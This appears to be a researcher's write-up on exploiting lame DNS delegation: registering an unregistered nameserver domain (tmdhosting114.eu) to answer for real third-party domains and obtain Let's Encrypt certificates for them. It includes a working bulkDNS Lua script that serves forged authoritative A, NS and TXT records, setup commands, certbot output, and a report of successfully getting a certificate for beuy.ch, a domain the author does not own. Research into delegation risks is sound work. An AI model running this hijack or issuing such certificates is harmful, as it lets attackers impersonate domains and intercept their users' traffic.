### Feasibility of issuing TLS cert for a domain name with partial lame delegation

The description of sacrificial nameservers and lame delegation and how it works can be found in 
[Risky BIZness: Risks Derived from Registrar Name Management](https://cs.stanford.edu/~gakiwate/papers/risky_bizness_imc21.pdf).

Is it possible to issue certificate for a domain name with partial/full lame delegation?

Let's say we have a domain name `tmdhosting114.eu`. This domain is set as the name server of several domain names:

```bash
(globalenv) srn@srnpc:~$ dig ns abukhaleed.com @a.gtld-servers.net

; <<>> DiG 9.18.39-0ubuntu0.24.04.3-Ubuntu <<>> ns abukhaleed.com @a.gtld-servers.net
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 14688
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 4, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;abukhaleed.com.			IN	NS

;; AUTHORITY SECTION:
abukhaleed.com.		172800	IN	NS	ns1.tmdhosting114.eu.
abukhaleed.com.		172800	IN	NS	ns2.tmdhosting114.eu.
abukhaleed.com.		172800	IN	NS	ns1.eu14.tmd.cloud.
abukhaleed.com.		172800	IN	NS	ns2.eu14.tmd.cloud.

;; Query time: 84 msec
;; SERVER: 192.5.6.30#53(a.gtld-servers.net) (UDP)
;; WHEN: Wed Apr 08 11:01:54 CEST 2026
;; MSG SIZE  rcvd: 145
```

For the domain name `abukhaleed.com`, 4 nameservers listed. `ns[12].eu14.tmd.cloud` are working nameservers and `ns[12].tmdhosting114.eu` is not even registered. By registering `tmdhosting114.eu`
and running a DNS server, one can have control a subset of the nameservers of the `abukhaleed.com` (2 out of 4 or 50%) but is it possible to issue a TLS cert for a domain?

Using Let's encrypt client to issue a TLS cert, one can use either [DNS-01](https://letsencrypt.org/docs/challenge-types/) or [HTTP-01](https://letsencrypt.org/docs/challenge-types/) challenges.

Let's say we use HTTP-01 challenge. Here is the NGINX configuration we need in the `/etc/nginx/conf.d/abukhaleed_com.conf`:
```bash
server {
    listen 80; 
    server_name abukhaleed.com;
    root /var/www/html/;
}
```
and also a working DNS server to answer queries going to `ns[12].tmdhosting114.eu`. By registering `tmdhosting114.eu` and defining two A records for `ns1` and `ns2` in the registerar panel, 
and specifying the IP address of our DNS server as X.X.X.X then running this Lua code with bulkDNS:


```lua
-- loading our DNS library
sdns = require("libsdns")
assert(sdns)
-- loading json for logging
json = require("json")
assert(json)

local string_find = string.find

-- here is the domain we want our nameserver to answer
local domain = "abukhaleed.com"

-- a helper function
function str_contains(str, substr)
    -- checks if substr exists in str
    -- returns: True if substr exists in str else false
    -- regular expression is off for this entry
    return string_find(str, substr, 1, true) ~= nil
end

-- the TXT record for DNS-01 challenge of let's encrypt (this will change every time)
local acme_challenge = "9b89104f-8c6f-420a-bbc0-2dc966516c5f.auth.acme-dns.io."


function main(raw_data, client_info)
    -- body of the main function goes here.
    -- you can convert the raw_data to a DNS packet and decide to answer
    -- the user or not. You can also create the log string here.
    if raw_data == nil then return nil, nil end
    local err = nil
    local response = nil
    response, err = sdns.from_network(raw_data)
    if response == nil then return nil, nil end
    local question = sdns.get_question(response)
    if question == nil then return nil, nil end

    local to_print = {client_ip=client_info.ip, client_port=client_info.port,
                      client_proto=client_info.proto, 
                      question={qname=question.qname, qtype=question.qtype, qclass=question.qclass}}
    if str_contains(string.lower(question.qname), domain) then
        print(json.encode(to_print))
    end

    if not str_contains(string.lower(question.qname), domain) then
        return nil, nil
    end
        
    -- let's just dump whaterver that is not class IN
    if question.qclass ~= "IN" then return nil, nil end

    -- what is the response to A request?
    if question.qtype == "A" then
        if str_contains(string.lower(question.qname), domain) then
            local a_response = sdns.create_response_from_query(response)
            sdns.add_rr_A(a_response, {ttl=86400, rdata={ip="65.108.220.8"}, name=question.qname, section="answer"})
            sdns.set_aa(a_response, 1)
            sdns.add_rr_NS(a_response, {ttl=86400, rdata={nsname='ns1.tmdhosting114.eu'}, name=question.qname, section="authority"})
            sdns.add_rr_NS(a_response, {ttl=86400, rdata={nsname='ns2.tmdhosting114.eu'}, name=question.qname, section="authority"})
            local a_response_raw = sdns.to_network(a_response)
            return nil, a_response_raw
        end
    end

    -- answer to NS queries
    if question.qtype == "NS" then
        if str_contains(string.lower(question.qname), domain) then
            local ns_response = sdns.create_response_from_query(response)
            sdns.add_rr_NS(ns_response, {ttl=86400, rdata={nsname='ns1.tmdhosting114.eu'}, name=question.qname, section="answer"})
            sdns.add_rr_NS(ns_response, {ttl=86400, rdata={nsname='ns2.tmdhosting114.eu'}, name=question.qname, section="answer"})
            sdns.set_aa(ns_response, 1)
            sdns.add_rr_A(ns_response, {ttl=86400, rdata={ip="65.108.220.8"}, name=question.qname, section="additional"})
            local ns_response_raw = sdns.to_network(ns_response)
            return nil, ns_response_raw
        end
    end
            
    -- for DNS-01 acme challenge
    if question.qtype == 'TXT' then
        if str_contains(string.lower(question.qname), domain) then
            local txt_response = sdns.create_response_from_query(response)
            sdns.add_rr_TXT(txt_response, {ttl=1800, rdata={txtdata=acme_challenge}, name=question.qname, section="answer"})
            sdns.set_aa(txt_response, 1)
            local txt_response_raw = sdns.to_network(txt_response)
            return nil, txt_response_raw
        end
    end

    -- return noerror with soa for whatever other queries for this domain
    if str_contains(string.lower(question.qname), domain) then
        local soa_response = sdns.create_response_from_query(response)
        sdns.add_rr_SOA(soa_response, {ttl=86400, rdata={mname="ns1.tmdhosting114.eu", rname="geek4arab.gmail.com",
                                                   refresh=3600, retry=1800, expire=1800, minimum=1800,serial=2026030710},
                                                   section="authority", name=question.qname})
        sdns.set_aa(soa_response, 1)
        local soa_response_raw = sdns.to_network(soa_response)
        return nil, soa_response_raw
    end

    -- no response (drop packet) in other cases.
    return nil, nil
end
```

Running this Lua code with bulkDNS:

```bash
bulkdns --server-mode --bind-ip=0.0.0.0 -p 5300 --lua-script=tmdhosting114_eu.lua
```
(Don't forget to use iptables to forward 53 to 5300)

In theory, it should work perfectly fine, but in practice, you have control over only a subset of the name servers (2 out of 4). Apparently, Let's encrypt uses different servers (locations) to send
query and get the A record of the domain name. 2 of the nameservers return your IP address while the other 2 return another IP address and this will result in 
**inconsistent DNS answers across authoritative nameservers** thus, failure in TLS certificate issue process:

```bash
root@servertestnader:/etc/nginx/conf.d# certbot --nginx -v
Saving debug log to /var/log/letsencrypt/letsencrypt.log
Plugins selected: Authenticator nginx, Installer nginx

Which names would you like to activate HTTPS for?
We recommend selecting either all domains, or all domains in a VirtualHost/server block.
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
1: abukhaleed.com
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Select the appropriate numbers separated by commas and/or spaces, or leave input
blank to select all options shown (Enter 'c' to cancel): 1
Requesting a certificate for abukhaleed.com
Performing the following challenges:
http-01 challenge for abukhaleed.com
Waiting for verification...
Challenge failed for domain abukhaleed.com
http-01 challenge for abukhaleed.com

Certbot failed to authenticate some domains (authenticator: nginx). The Certificate Authority reported these problems:
  Domain: abukhaleed.com
  Type:   unauthorized
  Detail: [THE OTHER IP ADDRESS]: Invalid response from http://abukhaleed.com/.well-known/acme-challenge/oqeclOru0tEhwGy-bTdb3rq0eGjmwn6QSqTvPemKXvY: 404

Hint: The Certificate Authority failed to verify the temporary nginx configuration changes made by Certbot. Ensure the listed domains point to this nginx server and that it is accessible from the internet.

Cleaning up challenges
Some challenges have failed.
Ask for help or search for solutions at https://community.letsencrypt.org. See the logfile /var/log/letsencrypt/letsencrypt.log or re-run Certbot with -v for more details.
```

The response shows that **`Some of the challenges have failed`** which means some of the DNS resolution resulted in the other IP address that is not under our control. It seems like
the code is [here](https://github.com/letsencrypt/boulder/blob/main/va/va.go#L345) saying that there will be local and remote servers to verify the challenge and there is a maximum
number of failure that is allowed. If the number of failures is greater than what is hardcoded in the code, then the certificate wong be issued.


To make sure that the setup is correct, it's possible to test the same scenario but this time with a domain name that only has `ns[12].tmdhosting114.eu` as the nameserver. `beuy.ch` is one 
of them (can be seen [here](https://dns.coffee/domains/beuy.ch)).

```bash

(globalenv) srn@srnpc:~$ dig @a.nic.ch. beuy.ch ns 

; <<>> DiG 9.18.39-0ubuntu0.24.04.3-Ubuntu <<>> @a.nic.ch. beuy.ch ns
; (2 servers found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 31357
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 2, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
;; QUESTION SECTION:
;beuy.ch.			IN	NS

;; AUTHORITY SECTION:
beuy.ch.		3600	IN	NS	ns2.tmdhosting114.eu.
beuy.ch.		3600	IN	NS	ns1.tmdhosting114.eu.

;; Query time: 42 msec
;; SERVER: 130.59.31.41#53(a.nic.ch.) (UDP)
;; WHEN: Wed Apr 08 11:31:31 CEST 2026
;; MSG SIZE  rcvd: 88

```

In theory, having control over `tmdhosting114.eu` should result in having control over `beuy.ch`. Using the same Lua code (mentioned earlier) by changing line 11 from:
```lua
local domain = "abukhaleed.com"
```
to
```lua
local domain = "beuy.ch"
```

and running bulkDNS, let's try to issue a TLS certificate. It's all good and the certificate can be issued successfully. Here is the list of requests we get when asking for certificate
using **certbot** and HTTP-01 challenge.

```json
{"question":{"qtype":"AAAA","qclass":"IN","qname":"BEuy.cH."},"client_port":8245,"client_ip":"23.178.112.105","client_proto":"UDP"}
{"question":{"qtype":"A","qclass":"IN","qname":"BEUy.cH."},"client_port":7460,"client_ip":"23.178.112.106","client_proto":"UDP"}
{"question":{"qtype":"AAAA","qclass":"IN","qname":"beuY.Ch."},"client_port":43401,"client_ip":"51.20.119.207","client_proto":"UDP"}
{"question":{"qtype":"A","qclass":"IN","qname":"bEUY.cH."},"client_port":45634,"client_ip":"51.20.119.207","client_proto":"UDP"}
{"question":{"qtype":"AAAA","qclass":"IN","qname":"Beuy.cH."},"client_port":8840,"client_ip":"52.27.193.53","client_proto":"UDP"}
{"question":{"qtype":"A","qclass":"IN","qname":"beuy.CH."},"client_port":52837,"client_ip":"52.27.193.53","client_proto":"UDP"}
{"question":{"qtype":"A","qclass":"IN","qname":"BEUy.cH."},"client_port":46286,"client_ip":"3.142.240.96","client_proto":"UDP"}
{"question":{"qtype":"AAAA","qclass":"IN","qname":"bEuY.ch."},"client_port":38332,"client_ip":"3.142.240.96","client_proto":"UDP"}
{"question":{"qtype":"AAAA","qclass":"IN","qname":"BeUY.ch."},"client_port":56652,"client_ip":"13.214.38.155","client_proto":"UDP"}
{"question":{"qtype":"A","qclass":"IN","qname":"BEuY.ch."},"client_port":50748,"client_ip":"13.214.38.155","client_proto":"UDP"}
{"question":{"qtype":"CAA","qclass":"IN","qname":"BeUy.ch."},"client_port":11337,"client_ip":"23.178.112.105","client_proto":"UDP"}
{"question":{"qtype":"CAA","qclass":"IN","qname":"Beuy.Ch."},"client_port":24484,"client_ip":"3.148.219.53","client_proto":"UDP"}
{"question":{"qtype":"CAA","qclass":"IN","qname":"beuY.ch."},"client_port":43903,"client_ip":"13.214.38.155","client_proto":"UDP"}
{"question":{"qtype":"CAA","qclass":"IN","qname":"Beuy.cH."},"client_port":8047,"client_ip":"13.50.251.109","client_proto":"UDP"}
{"question":{"qtype":"CAA","qclass":"IN","qname":"beuy.Ch."},"client_port":15832,"client_ip":"52.37.151.95","client_proto":"UDP"}
{"question":{"qtype":"A","qclass":"IN","qname":"BEUY.Ch."},"client_port":56778,"client_ip":"172.253.13.146","client_proto":"UDP"}
{"question":{"qtype":"AAAA","qclass":"IN","qname":"beuy.ch."},"client_port":25962,"client_ip":"162.158.209.112","client_proto":"UDP"}
{"question":{"qtype":"DNSKEY","qclass":"IN","qname":"beuy.ch."},"client_port":59215,"client_ip":"162.158.209.112","client_proto":"UDP"}
```

It seems like the requests (A and AAAA) are coming from different ASes and different countries for a single certificate. The case randomization comes from [Increased DNS Forgery Resistance Through 0x20-Bit Encoding](https://coeus.ece.gatech.edu/articles/increased_dns_resistance.pdf).

##### bottom line

1. Issuing a TLS certificate requires **consistent DNS answers across all authoritative nameservers**.
2. Partial control over nameservers results in **non-deterministic DNS resolution**, which causes ACME validation to fail.
3. Full control over all authoritative nameservers makes certificate issuance trivial.
4. The failure is independent of challenge type (HTTP-01 or DNS-01); both rely on consistent DNS resolution from multiple validation points.


